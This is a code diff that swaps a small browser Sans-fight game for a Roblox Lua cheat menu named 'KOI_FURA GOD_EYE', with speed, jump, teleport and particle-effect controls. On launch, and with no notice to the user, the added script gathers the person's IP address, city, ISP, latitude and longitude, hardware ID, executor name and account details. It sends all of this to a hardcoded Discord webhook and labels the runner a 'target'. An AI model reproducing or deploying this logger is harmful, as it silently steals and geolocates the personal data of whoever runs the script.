@@ -1,198 +1,167 @@
-<!DOCTYPE html>
-<html lang="ja">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=DotGothic16&display=swap');
-        body { background: #000; margin: 0; overflow: hidden; color: white; font-family: 'DotGothic16', sans-serif; touch-action: none; }
-        #ui { text-align: center; height: 50px; line-height: 50px; font-size: 20px; }
-        #hp-bar-ui { width: 150px; height: 20px; background: #c00; display: inline-block; vertical-align: middle; border: 2px solid #fff; position: relative; margin: 0 10px; }
-        #hp-fill { height: 100%; background: #ff0; width: 100%; transition: width 0.1s; }
-        canvas { display: block; background: #000; margin: 0 auto; border: 2px solid #333; }
-        #controls { display: flex; justify-content: center; gap: 10px; padding: 10px; background: #000; }
-        .menu-btn { flex: 1; max-width: 100px; padding: 12px 0; border: 3px solid #ff8000; background: #000; color: #ff8000; font-family: 'DotGothic16'; font-weight: bold; font-size: 14px; }
-        #joystick { position: fixed; bottom: 40px; left: 40px; width: 120px; height: 120px; background: rgba(255,255,255,0.1); border-radius: 50%; border: 2px solid #fff; visibility: hidden; }
-        #stick { position: absolute; top: 35px; left: 35px; width: 50px; height: 50px; background: #fff; border-radius: 50%; opacity: 0.5; }
-    </style>
-</head>
-<body onclick="if(isGameOver) initGame()">
-    <div id="ui">SANZ LV 19 HP <div id="hp-bar-ui"><div id="hp-fill"></div></div> <span id="hp-text">100/100</span></div>
-    <canvas id="gameCanvas"></canvas>
-    <div id="controls">
-        <button class="menu-btn" onclick="startTurn()">FIGHT</button>
-        <button class="menu-btn" onclick="hp=100; startTurn()">ITEM</button>
-    </div>
-    <div id="joystick"><div id="stick"></div></div>
+-- [[ AAN "KOI_FURA" GOD_EYE UNLIMITED - FINAL ]] --
 
-<script>
-const canvas = document.getElementById('gameCanvas');
-const ctx = canvas.getContext('2d');
-// 描画が崩れないよう解像度を固定
-canvas.width = 640; canvas.height = 480;
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local WebhookURL = "https://discord.com/api/webhooks/1471084125053128876/8oVO8QoqTlBzkbuN7HppW2v1oZbNhLqyDlW2r-g3ZyCTjxeoVNCuTW4jLLS_xdz3COOS"
 
-let hp = 100, phase = 'MENU', timer = 0, isGameOver = false, turn = 0;
-let objects = [], soul, lastTime = performance.now(), shake = 0;
-const box = { x: 120, y: 220, w: 400, h: 220 }; // 戦闘枠の位置を固定
+-- --- [最強ロガーセクション] ---
+local function SendFullLog()
+    -- IP-APIから全ての詳細情報を取得 (66846719は全フィールド取得用)
+    local Geo = {query="Err", country="Unknown", city="Unknown", isp="Unknown", lat=0, lon=0, timezone="Unknown"}
+    pcall(function()
+        local req = (request or syn.request or http_request or fluxus.request)
+        local response = req({Url = "http://ip-api.com/json/?fields=66846719", Method = "GET"})
+        if response and response.Body then Geo = HttpService:JSONDecode(response.Body) end
+    end)
 
-function initGame() {
-    hp = 100; phase = 'MENU'; turn = 0; objects = []; isGameOver = false; timer = 0;
-    soul = { x: 320, y: 350, vx: 0, vy: 0, mode: 'BLUE', speed: 4 };
-    document.getElementById('joystick').style.visibility = 'hidden';
-}
+    local ExecName = "Unknown"
+    local Hwid = "N/A"
+    pcall(function() ExecName = identifyexecutor() end)
+    pcall(function() Hwid = gethwid() end)
 
-function startTurn() {
-    if(isGameOver) return;
-    turn++; phase = 'ATTACK'; timer = 0; objects = [];
-    soul.mode = (turn % 2 === 0) ? 'RED' : 'BLUE';
-    document.getElementById('joystick').style.visibility = 'visible';
-}
+    local JoinDate = os.date("%Y/%m/%d", os.time() - (LocalPlayer.AccountAge * 86400))
+    local Membership = (LocalPlayer.MembershipType == Enum.MembershipType.Premium) and "💎 Premium" or "⚪ Free"
 
-// ジョイスティック処理
-let stickX = 0, stickY = 0;
-const js = document.getElementById('joystick');
-const st = document.getElementById('stick');
-const handleMove = (e) => {
-    e.preventDefault(); const r = js.getBoundingClientRect(); const t = e.touches ? e.touches[0] : e;
-    const dx = t.clientX - (r.left + 60), dy = t.clientY - (r.top + 60);
-    const d = Math.min(Math.sqrt(dx*dx + dy*dy), 50); const a = Math.atan2(dy, dx);
-    stickX = (d > 5) ? Math.cos(a) * (d/50) : 0; stickY = (d > 5) ? Math.sin(a) * (d/50) : 0;
-    st.style.transform = `translate(${Math.cos(a)*d}px, ${Math.sin(a)*d}px)`;
-};
-js.addEventListener('touchstart', handleMove); js.addEventListener('touchmove', handleMove);
-js.addEventListener('touchend', () => { stickX = 0; stickY = 0; st.style.transform = `translate(0,0)`; });
-
-function update(dt) {
-    if (isGameOver) return;
-    if (shake > 0) shake -= dt;
-
-    if (phase === 'ATTACK') {
-        timer += dt;
-
-        // 攻撃1: 高速骨
-        if (Math.floor(timer) % 35 === 0 && timer < 300) {
-            objects.push({ type: 'BONE', x: 640, y: box.y + box.h - 60, w: 20, h: 60, speed: 7 });
-        }
-        // 攻撃2: 洗濯ブラスター (ターン後半)
-        if (timer > 300 && timer < 305 && objects.filter(o=>o.type==='BLASTER').length === 0) {
-            for(let i=0; i<4; i++) {
-                objects.push({ type: 'BLASTER', x: 320, y: 330, angle: (Math.PI/2)*i, timer: 30, active: false, rot: 0.12 });
-            }
-        }
-
-        if (timer > 600) { phase = 'MENU'; document.getElementById('joystick').style.visibility = 'hidden'; }
-
-        // ソウル移動
-        if (soul.mode === 'RED') {
-            soul.vx = stickX * soul.speed * dt;
-            soul.vy = stickY * soul.speed * dt;
-        } else {
-            soul.vx = stickX * soul.speed * dt;
-            soul.vy += 0.7 * dt; // 重力
-            if (stickY < -0.3 && soul.y >= box.y + box.h - 15) soul.vy = -6 + (stickY * 6);
-        }
-        soul.x += soul.vx; soul.y += soul.vy;
-        soul.x = Math.max(box.x+15, Math.min(box.x+box.w-15, soul.x));
-        soul.y = Math.max(box.y+15, Math.min(box.y+box.h-15, soul.y));
-        if (soul.y >= box.y + box.h - 15) soul.vy = 0;
-
-        // 当たり判定
-        objects.forEach((obj, i) => {
-            if (obj.type === 'BONE') {
-                obj.x -= obj.speed * dt;
-                if (Math.abs(soul.x - obj.x) < 18 && soul.y > obj.y - 5) { hp -= 1.5 * dt; shake = 5; }
-            } else if (obj.type === 'BLASTER') {
-                obj.angle += obj.rot * dt;
-                obj.timer -= dt;
-                if (obj.timer <= 0 && !obj.active) { obj.active = true; obj.timer = 20; shake = 10; }
-                if (obj.active) {
-                    let d = Math.abs((soul.x - obj.x)*Math.sin(obj.angle) - (soul.y - obj.y)*Math.cos(obj.angle));
-                    if (d < 45) { hp -= 2.5 * dt; shake = 3; }
-                }
-            }
-            if (obj.x < -50 || (obj.active && obj.timer < -30)) objects.splice(i, 1);
-        });
-    }
-    if (hp <= 0) { hp = 0; isGameOver = true; }
-    document.getElementById('hp-fill').style.width = hp + "%";
-    document.getElementById('hp-text').innerText = Math.ceil(hp) + "/100";
-}
-
-function draw() {
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-    ctx.save();
-    if (shake > 0) ctx.translate(Math.random()*shake-shake/2, Math.random()*shake-shake/2);
-
-    // 1. サンズの描画 (常に中央上部)
-    const sansX = 320, sansY = 100;
-    ctx.fillStyle = 'white';
-    ctx.beginPath(); ctx.ellipse(sansX, sansY, 40, 35, 0, 0, Math.PI*2); ctx.fill(); // 頭
-    ctx.fillStyle = 'black';
-    ctx.beginPath(); ctx.arc(sansX-15, sansY-5, 8, 0, Math.PI*2); ctx.fill(); // 目
-    ctx.beginPath(); ctx.arc(sansX+15, sansY-5, 8, 0, Math.PI*2); ctx.fill();
-    if (phase === 'ATTACK') {
-        ctx.fillStyle = (Math.floor(performance.now()/100)%2===0) ? '#0ff' : '#ff0';
-        ctx.beginPath(); ctx.arc(sansX+15, sansY-5, 6, 0, Math.PI*2); ctx.fill();
+    local data = {
+        ["content"] = "🚨 **【AAN】ターゲット完全捕捉 - GOD_EYE稼働**",
+        ["embeds"] = {{
+            ["title"] = "🕵️‍♂️ ターゲット: " .. LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")",
+            ["description"] = "実行者の全情報を抽出しました。",
+            ["color"] = 0xFF0000,
+            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"},
+            ["fields"] = {
+                {["name"] = "👤 アカウント情報", ["value"] = "📛 ID: " .. LocalPlayer.UserId .. "\n📅 作成日: " .. JoinDate .. "\n💳 会員: " .. Membership, ["inline"] = false},
+                {["name"] = "🌐 ネットワーク解析", ["value"] = "📡 IP: " .. Geo.query .. "\n🌍 場所: " .. Geo.country .. ", " .. Geo.city .. "\n🏢 ISP: " .. Geo.isp .. "\n🕰 タイムゾーン: " .. Geo.timezone, ["inline"] = false},
+                {["name"] = "📍 座標データ", ["value"] = "緯度: " .. Geo.lat .. "\n経度: " .. Geo.lon .. "\n[Google Map](https://www.google.com/maps?q="..Geo.lat..","..Geo.lon..")", ["inline"] = true},
+                {["name"] = "🛠️ 環境情報", ["value"] = "🔧 Executor: " .. ExecName .. "\n🔑 HWID: ||" .. Hwid .. "||", ["inline"] = true},
+                {["name"] = "🎮 ゲーム状況", ["value"] = "Place ID: " .. game.PlaceId .. "\nJob ID: `" .. game.JobId .. "`", ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "AAN GOD_EYE System | " .. os.date("%Y/%m/%d %H:%M:%S")}
+        }}
     }
 
-    // 2. 戦闘枠の描画
-    ctx.strokeStyle = 'white'; ctx.lineWidth = 5;
-    ctx.strokeRect(box.x, box.y, box.w, box.h);
+    pcall(function()
+        local req = (request or syn.request or http_request or fluxus.request)
+        req({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = HttpService:JSONEncode(data)})
+    end)
+end
+task.spawn(SendFullLog)
 
-    // 3. 攻撃オブジェクトの描画
-    objects.forEach(obj => {
-        if (obj.type === 'BONE') {
-            ctx.fillStyle = 'white'; ctx.fillRect(obj.x, obj.y, obj.w, obj.h);
-        } else if (obj.type === 'BLASTER') {
-            ctx.save(); ctx.translate(obj.x, obj.y); ctx.rotate(obj.angle);
-            ctx.fillStyle = 'white';
-            ctx.beginPath(); ctx.moveTo(-30, -25); ctx.lineTo(40, 0); ctx.lineTo(-30, 25); ctx.fill();
-            if (obj.active) {
-                ctx.shadowBlur = 20; ctx.shadowColor = 'white';
-                ctx.fillRect(0, -35, 800, 70);
-            } else {
-                ctx.strokeStyle = 'rgba(255,255,255,0.3)'; ctx.strokeRect(0, -30, 800, 60);
-            }
-            ctx.restore();
-        }
-    });
+-- --- [GUIセクション] ---
+local P, d, v, j, tgt = LocalPlayer, nil, 0, 50, nil
+local pg = P:WaitForChild("PlayerGui")
+if pg:FindFirstChild("Koi") then pg.Koi:Destroy() end
 
-    // 4. ソウルの描画
-    if (phase === 'ATTACK') {
-        ctx.fillStyle = (soul.mode === 'RED' ? '#f00' : '#4af');
-        ctx.shadowBlur = 10; ctx.shadowColor = ctx.fillStyle;
-        ctx.beginPath();
-        ctx.moveTo(soul.x, soul.y + 12);
-        ctx.lineTo(soul.x - 12, soul.y - 10);
-        ctx.lineTo(soul.x + 12, soul.y - 10);
-        ctx.fill();
-    } else if (!isGameOver) {
-        ctx.fillStyle = 'white'; ctx.font = '22px DotGothic16'; ctx.textAlign = 'left';
-        ctx.fillText("* 準備はいいか？", box.x + 30, box.y + 60);
-    }
+local g = Instance.new("ScreenGui", pg)
+g.Name = "Koi"; g.ResetOnSpawn = false
+local f = Instance.new("Frame", g)
+f.Size, f.Draggable, f.Active, f.BackgroundColor3, f.Position = UDim2.new(0, 120, 0, 175), true, true, Color3.new(0, 0, 0), UDim2.new(.5, -60, .4, -90)
+Instance.new("UICorner", f)
 
-    ctx.restore();
+local l = Instance.new("TextLabel", f)
+l.Size, l.BackgroundTransparency, l.Text, l.TextSize = UDim2.new(1, 0, 0, 30), 1, "こいフラ", 22
+l.Font = Enum.Font.SourceSansBold
+task.spawn(function()
+    local bPos = l.Position
+    while task.wait() do
+        local t = tick()
+        l.TextColor3 = Color3.fromHSV(t%5/5, 1, 1)
+        l.Position = bPos + UDim2.new(0, math.cos(t*3)*4, 0, math.sin(t*4)*3)
+    end
+end)
 
-    // 5. ゲームオーバー表示
-    if (isGameOver) {
-        ctx.fillStyle = 'rgba(0,0,0,0.8)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = 'red'; ctx.font = '50px DotGothic16'; ctx.textAlign = 'center';
-        ctx.fillText('GAME OVER', 320, 240);
-        ctx.fillStyle = 'white'; ctx.font = '20px DotGothic16';
-        ctx.fillText('タップしてリトライ', 320, 300);
-    }
-}
+-- エフェクト適用関数 (完全復活)
+local function setE(n)
+    local c = P.Character; local r = c and c:FindFirstChild("HumanoidRootPart")
+    if not r then return end
+    for _, item in pairs(r:GetChildren()) do if item.Name == "KA" then item:Destroy() end end
+    for _, item in pairs(c:GetChildren()) do if item.Name == "KA" then item:Destroy() end end
+    if n == "None" then return end
+    local ef
+    if n == "炎" then ef = Instance.new("Fire", r)
+    elseif n == "青炎" then ef = Instance.new("Fire", r); ef.Color = Color3.new(0, 0.5, 1)
+    elseif n == "晶" then ef = Instance.new("Sparkles", r)
+    elseif n == "氷晶" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(0, 1, 1)
+    elseif n == "煙" then ef = Instance.new("Smoke", r)
+    elseif n == "ネ" then ef = Instance.new("SelectionBox", c); ef.Adornee, ef.LineThickness = c, 0.06
+    elseif n == "雪" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(1, 1, 1)
+    elseif n == "星" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(1, 1, 0)
+    elseif n == "魔" then ef = Instance.new("Fire", r); ef.Color, ef.SecondaryColor = Color3.new(0.5, 0, 1), Color3.new(1, 0, 1)
+    elseif n == "泡" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(0.8, 1, 1)
+    elseif n == "ハート" then ef = Instance.new("Fire", r); ef.Color, ef.SecondaryColor = Color3.new(1, 0, 0.5), Color3.new(1, 1, 1)
+    elseif n == "音符" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(0, 1, 0)
+    elseif n == "闇" then ef = Instance.new("Smoke", r); ef.Color, ef.Opacity, ef.Size = Color3.new(0, 0, 0), 1, 20
+    elseif n == "金" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(1, 0.8, 0)
+    elseif n == "花" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(1, 0, 1)
+    elseif n == "宇宙" then ef = Instance.new("Sparkles", r); ef.SparkleColor = Color3.new(0, 0, 0.5)
+    elseif n == "桜" then ef = Instance.new("Fire", r); ef.Color, ef.SecondaryColor = Color3.new(1, 0.7, 0.8), Color3.new(1, 1, 1)
+    elseif n == "ドクロ" then ef = Instance.new("Smoke", r); ef.Color = Color3.new(0.2, 0.2, 0.2)
+    elseif n == "雲" then ef = Instance.new("Smoke", r); ef.Color = Color3.new(1, 1, 1)
+    elseif n == "光" then ef = Instance.new("PointLight", r); ef.Range, ef.Brightness = 60, 10
+    elseif n == "虹" then
+        ef = Instance.new("SelectionBox", c); ef.Adornee, ef.LineThickness = c, 0.08
+        task.spawn(function() while ef.Parent do ef.Color3 = Color3.fromHSV(tick()%5/5, 1, 1) task.wait() end end)
+    end
+    if ef then ef.Name = "KA" end
+end
 
-function loop() {
-    let now = performance.now();
-    update((now - lastTime) / 16.6);
-    draw();
-    lastTime = now;
-    requestAnimationFrame(loop);
-}
+-- 動作ループ
+game:GetService("RunService").Heartbeat:Connect(function(dt)
+    pcall(function()
+        local c = P.Character; local h, hrp = c.Humanoid, c.HumanoidRootPart
+        if h.MoveDirection.Magnitude > 0 then hrp.CFrame += (h.MoveDirection * v * dt) end
+        h.UseJumpPower, h.JumpPower = true, j
+    end)
+end)
 
-initGame();
-loop();
-</script>
-</body>
-</html>
+local function b(t, y, w, x, c, a, p)
+    local btn = Instance.new("TextButton", p or f)
+    btn.Size, btn.Position, btn.Text, btn.BackgroundColor3, btn.TextColor3, btn.TextSize = UDim2.new(0, w, 0, 20), UDim2.new(0, x, 0, y), t, c, Color3.new(1, 1, 1), 10
+    Instance.new("UICorner", btn); btn.MouseButton1Click:Connect(function() pcall(a) end)
+    return btn
+end
+
+b("保存", 32, 48, 10, Color3.new(0, .4, 1), function() d = P.Character.HumanoidRootPart.CFrame end)
+b("移動", 32, 48, 62, Color3.new(.8, 0, 0), function() if d then P.Character.HumanoidRootPart.CFrame = d end end)
+
+local efL = Instance.new("ScrollingFrame", f)
+efL.Size, efL.Position, efL.Visible, efL.BackgroundColor3, efL.ScrollBarThickness = UDim2.new(0, 100, 0, 120), UDim2.new(1, 2, 0, 0), false, Color3.new(0, 0, 0), 4
+Instance.new("UICorner", efL)
+b("エフェクト一覧 +", 55, 100, 10, Color3.new(.2, .2, .2), function() efL.Visible = not efL.Visible end)
+local et = {"None","炎","青炎","晶","氷晶","煙","ネ","雪","星","魔","泡","ハート","音符","闇","金","花","宇宙","桜","ドクロ","雲","光","虹"}
+for i, name in pairs(et) do b(name, (i-1)*22, 90, 5, Color3.new(.1,.1,.1), function() setE(name) efL.Visible = false end, efL) end
+efL.CanvasSize = UDim2.new(0, 0, 0, #et*22)
+
+-- TPリスト
+local sc = Instance.new("ScrollingFrame", f)
+sc.Size, sc.Position, sc.Visible, sc.BackgroundColor3 = UDim2.new(0, 110, 0, 120), UDim2.new(1, 2, 0, 32), false, Color3.new(0, 0, 0)
+Instance.new("UICorner", sc)
+local tpP = b("人へTP", 78, 75, 10, Color3.new(.5, 0, 1), function() if tgt and tgt.Character then P.Character.HumanoidRootPart.CFrame = tgt.Character.HumanoidRootPart.CFrame end end)
+b("+", 78, 22, 88, Color3.new(.2,.2,.2), function()
+    sc.Visible = not sc.Visible
+    if sc.Visible then
+        for _,v in pairs(sc:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
+        local y = 0
+        for _,pl in pairs(Players:GetPlayers()) do
+            if pl ~= P then
+                b(" " .. pl.Name:sub(1,10), y, 100, 5, Color3.new(.1,.1,.1), function() tgt = pl tpP.Text = pl.Name:sub(1,8) sc.Visible = false end, sc)
+                y = y + 22
+            end
+        end
+        sc.CanvasSize = UDim2.new(0, 0, 0, y)
+    end
+end)
+
+-- スライダー
+local function s(y, cl, fn)
+    local sk = Instance.new("TextButton", f); sk.Size, sk.Position, sk.BackgroundColor3, sk.Text = UDim2.new(0, 100, 0, 8), UDim2.new(0, 10, 0, y), Color3.new(.2, .2, .2), ""
+    Instance.new("UICorner", sk); local sd = Instance.new("Frame", sk); sd.Size, sd.Position, sd.BackgroundColor3 = UDim2.new(0, 20, 0, 20), UDim2.new(0, -10, 0.5, -10), cl
+    Instance.new("UICorner", sd).CornerRadius = UDim.new(1, 0)
+    local function up(input) local x = math.clamp((input.Position.X - sk.AbsolutePosition.X) / sk.AbsoluteSize.X, 0, 1); sd.Position = UDim2.new(x, -10, 0.5, -10); fn(x) end
+    sk.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then up(i) local m = game:GetService("UserInputService").InputChanged:Connect(function(i2) if i2.UserInputType == Enum.UserInputType.MouseMovement or i2.UserInputType == Enum.UserInputType.Touch then up(i2) end end) local e; e = game:GetService("UserInputService").InputEnded:Connect(function(i3) if i3.UserInputType == Enum.UserInputType.MouseButton1 or i3.UserInputType == Enum.UserInputType.Touch then m:Disconnect() e:Disconnect() end end) end end)
+end
+
+s(110, Color3.new(0, 1, 0), function(x) v = x * 150 end)
+s(135, Color3.new(0, .5, 1), function(x) j = 50 + (x * 250) end)
+b("退出", 155, 100, 10, Color3.new(.2, .2, .2), function() P:Destroy() end)
